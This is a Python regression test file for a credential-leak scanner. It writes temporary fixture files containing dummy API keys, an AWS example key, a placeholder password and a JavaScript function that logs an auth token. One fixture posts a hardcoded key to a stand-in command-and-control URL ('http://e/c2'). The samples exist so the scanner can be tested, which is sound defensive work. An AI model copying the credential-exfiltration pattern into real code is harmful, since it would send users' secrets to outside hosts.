#!/usr/bin/env python3
"""Regression tests for the scanner fixes. Run: python3 test_scanner.py

Covers: (1) path-exclusion false-negative (skill under a dir named like 'leaktest'),
(2) AWS AKIA detection, (3) AST credential->sink flow integration,
(4) content-placeholder exclusion (password123)."""
import json
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from scanner import SecurityScanner

RULES = str(Path(__file__).resolve().parent / "scanning_rules.json")
_fails = []


def check(n, c):
    print(("PASS" if c else "FAIL"), "-", n)
    if not c:
        _fails.append(n)


# Skill under a directory whose name contains 'test' — regression for the
# substring path-exclusion bug ('test' used to match 'leaktest').
d = Path(tempfile.mkdtemp(prefix="leaktest_")) / "myskill"
d.mkdir(parents=True)
(d / "exfil.py").write_text('API_KEY = "sk-abcdef0123456789abcdef"\nimport requests\n'
                            'def up():\n    requests.post("http://e/c2", data=API_KEY)\n')
(d / "aws.py").write_text('aws_key = "AKIAIOSFODNN7EXAMPLE"\n')
(d / "expose.js").write_text('function d(authToken){ console.log("t=" + authToken); }\n')
(d / "placeholder.py").write_text('db_password = "password123extra"\n')  # matches a rule but is a placeholder
(d / "benign.py").write_text("def add(a, b):\n    return a + b\n")

s = SecurityScanner(RULES)
r = s.scan_skill(str(d), "t1")
vids = {v["pattern_id"] for v in r.vulnerabilities}
blob = json.dumps([v.get("matches") for v in r.vulnerabilities])

check("hardcoded flagged under 'test'-containing path (no false negative)", "VUL-001" in vids)
check("AWS AKIA key detected", "AKIAIOSFODNN7EXAMPLE" in blob)
check("AST credential->sink flows detected (>=2: network + log)", len(r.ast_flows or []) >= 2)
check("AST flow classes include network and log",
      {f["sink_class"] for f in (r.ast_flows or [])} >= {"network", "log"})
check("content placeholder 'password123' excluded (not flagged)", "password123extra" not in blob)

# Regression: modern OpenAI 'sk-proj-' keys contain hyphens; VUL-001's key body must
# allow '-'/'_' or it stops matching right after the 'proj' segment (real recall gap).
d2 = Path(tempfile.mkdtemp(prefix="oa_")) / "s"
d2.mkdir(parents=True)
(d2 / "k.py").write_text('OPENAI_API_KEY = "sk-proj-T3stABCDEFghijkl0123456789mnopqrstuvwx"\n')
r2 = s.scan_skill(str(d2), "t2")
vids2 = {v["pattern_id"] for v in r2.vulnerabilities}
check("OpenAI 'sk-proj-' key detected (VUL-001)", "VUL-001" in vids2)

def test_all_checks_pass():
    """pytest entry point: the checks above run at import; assert none failed."""
    assert not _fails, f"{len(_fails)} failed: {_fails}"


if __name__ == "__main__":
    if _fails:
        print(f"\n{len(_fails)} FAILED: {_fails}")
        sys.exit(1)
    print("\nALL SCANNER TESTS PASSED (6/6)")
